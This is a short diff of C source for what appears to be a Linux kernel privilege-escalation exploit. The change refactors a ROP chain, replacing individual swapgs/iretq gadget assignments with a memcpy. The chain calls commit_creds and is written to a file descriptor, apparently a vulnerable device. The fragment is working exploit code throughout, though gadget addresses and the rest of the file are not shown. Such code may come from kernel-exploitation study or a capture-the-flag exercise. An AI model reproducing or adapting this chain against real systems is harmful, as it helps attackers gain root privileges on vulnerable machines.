@@ -34,16 +34,10 @@ int main(){
     rop[7] = pop_rcx;
     rop[8] = 0x0000000000000000;
     rop[9] = mov_rdi_rax;
-
     rop[10] = commit_creds;
-    rop[11] = gadget[0];   // swapgs; ret;
-    rop[12] = gadget[1];   // iretq; ret;
-    rop[13] = gadget[2];
-    rop[14] = gadget[3];
-    rop[15] = gadget[4];
-    rop[16] = gadget[5];
-    rop[17] = gadget[6];
-
+    
+    memcpy(&rop[11], gadget, 8*7);
+    
     write(fd, rop,  sizeof(rop));
 
     close(fd);
